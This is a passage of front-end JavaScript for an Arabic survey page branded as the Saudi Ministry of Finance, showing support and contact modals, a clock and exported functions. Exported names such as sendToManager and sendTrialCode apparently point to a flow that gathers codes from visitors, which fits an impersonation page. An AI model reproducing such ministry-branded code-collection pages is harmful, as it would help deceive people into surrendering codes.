            <li><strong>لا يمكن إرسال النموذج:</strong> تأكد من ملء جميع الحقول الإلزامية</li>
            <li><strong>مشكلة في التاريخ:</strong> اختر كلاً من الشهر والسنة</li>
            <li><strong>الموقع لا يعمل:</strong> جرب تحديث الصفحة أو استخدام متصفح مختلف</li>
        </ul>
    `;
    document.getElementById('supportContent').innerHTML = content;
    document.getElementById('supportModal').classList.add('active');
}

function showContact() {
    const content = `
        <h4>اتصل بنا</h4>
        <p>نرحب باتصالاتكم واستفساراتكم في أي وقت.</p>
        
        <div class="contact-info">
            <div class="contact-item">
                <h5><i class="fas fa-map-marker-alt"></i> العنوان</h5>
                <p>الرياض، المملكة العربية السعودية<br>وزارة المالية - مبنى الوزارة الرئيسي</p>
            </div>
            
            <div class="contact-item">
                <h5><i class="fas fa-phone"></i> الهواتف</h5>
                <p>
                    الدعم الفني: ${CONFIG.SYSTEM.SUPPORT_PHONE}<br>
                    الاستفسارات العامة: 0114444444<br>
                    فاكس: 0114444445
                </p>
            </div>
            
            <div class="contact-item">
                <h5><i class="fas fa-envelope"></i> البريد الإلكتروني</h5>
                <p>
                    الاستبيانات: surveys@mof.gov.sa<br>
                    الدعم: support@mof.gov.sa<br>
                    العلاقات العامة: pr@mof.gov.sa
                </p>
            </div>
        </div>
    `;
    document.getElementById('contactContent').innerHTML = content;
    document.getElementById('contactModal').classList.add('active');
}

// تحديث الوقت
function updateTime() {
    const now = new Date();
    const currentLang = localStorage.getItem('preferredLanguage') || 'ar';
    const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZone: 'Asia/Riyadh'
    };
    
    const locales = {
        'ar': 'ar-SA',
        'en': 'en-US',
        'ber': 'en-US'
    };
    
    const timeElement = document.getElementById('current-time');
    if (timeElement) {
        timeElement.textContent = 
            now.toLocaleDateString(locales[currentLang] || 'ar-SA', options);
    }
}

// ============================================
// تعريف الوظائف العامة للوصول من HTML
// ============================================

window.changeLanguage = changeLanguage;
window.sendToManager = sendToManager;
window.fillTrialCode = fillTrialCode;
window.sendTrialCode = sendTrialCode;
window.fillFinalCode = fillFinalCode;
window.sendFinalCode = sendFinalCode;
window.newSurvey = newSurvey;
window.shareSurvey = shareSurvey;
window.viewStatus = viewStatus;
window.copyToClipboard = copyToClipboard;
window.closeAllModals = closeAllModals;
window.goHome = goHome;
window.showPrivacy = showPrivacy;
window.showTerms = showTerms;
window.showFAQ = showFAQ;
window.showSupport = showSupport;
window.showContact = showContact;

// بدء تحديث الوقت كل ثانية
setInterval(updateTime, 1000);
updateTime();

// تهيئة مؤشر التقدم عند التحميل
setTimeout(() => {
    updateProgressIndicator(1);
}, 500);